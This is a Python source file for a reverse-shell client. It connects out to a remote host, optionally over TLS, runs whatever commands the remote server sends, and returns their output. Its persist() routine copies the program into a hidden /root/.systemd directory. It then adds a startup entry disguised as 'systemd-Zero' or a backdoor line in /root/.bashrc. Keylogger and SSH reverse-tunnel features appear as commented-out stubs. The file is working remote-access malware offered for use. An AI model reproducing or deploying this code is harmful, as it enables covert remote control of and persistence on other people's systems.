#!/usr/bin/env python3

"""
Author       - pyCity
Date         - 1/22/2019
Version      - 1.2

Usage:       - python client.py --tls 127.0.0.1 4444

Description: - Reverse shell in python 3. Has TLS functionality using
             - a DHE-RSA-AES256-SHA256 cipher.
"""

import socket
import subprocess
import os
import platform
import sys
import shutil
import time
import argparse
import ssl


def parse_args():
    """Define host and port variables with optional tls"""

    parser = argparse.ArgumentParser(description="Python remote tcp client")
    parser.add_argument("host", help="Remote host name to connect to")
    parser.add_argument("port", help="Remote port to connect to", type=int)
    parser.add_argument("--tls", help="Enable TLS encryption", action="store_true")

    # Array of parsed arguments (host, port, encryption)
    args = parser.parse_args()
    host, port, enc = args.host, args.port, args.tls
    return host, port, enc



def connect(host, port, enc=False):
    """Create socket object, connect socket to server"""

    s = socket.socket()
    socket.setdefaulttimeout(10)

    # Wait 10 secs if connection isn't successful immediately
    for i in range(10):
        try:
            if enc == True:
                context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
                context.set_ciphers('DHE-RSA-AES256-SHA256')
                context.load_dh_params("dhparam.pem")
                context.load_cert_chain(certfile="server.crt", keyfile="server.key")
                s = context.wrap_socket(s, do_handshake_on_connect=True)
            s.connect((host, port))
            return s

        except:
            time.sleep(5)



def expand_path(path):
    """Expand environment vars with metacharacters in a path"""
    return os.path.expandvars(os.path.expanduser(path))


def persist():
    """Installs agent onto system via system service. If it fails, try to backdoor root/.bashrc"""

    if platform.system() == "Linux":
        hidden_dir = expand_path("/root/.systemd")
        if not os.path.exists(hidden_dir):
            os.makedirs(hidden_dir)

        # sys.executable is the path to this executable that was ran
        hidden_path = os.path.join(hidden_dir, os.path.basename(sys.executable))
        shutil.copyfile(sys.executable, hidden_path)
        os.system("chmod +x " + hidden_path)

        if os.path.exists("/root/.config/autostart/"):
            new_job = "[Desktop Entry]\nVersion=1.5\nType=Application\nName=systemd-Zero\nExec={}\n".format(hidden_path)
            with open(expand_path("/root/.config/autostart/systemd.desktop"), "w") as f:
                f.write(new_job)
        else:
            with open(expand_path("/root/.bashrc"), "a") as f:
                f.write("\n(if [ $(ps aux|grep " + os.path.basename(sys.executable) + "|wc -l) -lt 2 ]; then " + hidden_path + ";fi&)\n")

def ssh_tunnel():
    """Forward port 22 on this host to 2222 on remote host"""

    # cmd = "ssh -Nf -R 2222:localhost:22 {}@{}".format(host, port)
    # print(cmd)
    pass

def keylogger():
    #subprocess.Popen("nohup keylogger.py &",
    #                  shell=True, stdout=subprocess.PIPE,
    #                  stderr=subprocess.PIPE)
    pass

def clean():
    """Removes installed agent"""
    pass


def serve_shell(s):
    """Receive commands from remote server and run on local machine"""

    # Reverse shell with added commands
    while True:
        data = s.recv(1024).decode("utf-8")
        if data[:2] == 'cd':
            os.chdir(data[3:].strip())
        elif data[:2].strip() == "os":
            s.send(str.encode(" -- OS : " + sys.platform + " " + platform.release() + "\n" +
                              " -- Build : " + platform.version() + "\n" +
                              " -- Python version : " + platform.python_version() + "\n"))

        elif data[:6] == "persist":
            persist()
            s.send(str.encode("Agent installed."))
        elif data[:4].strip() == "kill":
            break
        if len(data) > 0:
            cmd = subprocess.Popen(data[:], shell=True,
                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)

            bytes_recieved = cmd.stdout.read() + cmd.stderr.read()
            output = str(bytes_recieved, "utf-8")
            s.send(str.encode(output + str(os.getcwd()) + '#> '))
    s.close()
    sys.exit()



if __name__ == "__main__":
    host, port, enc = parse_args()
    serve_shell(connect(host, port, enc))
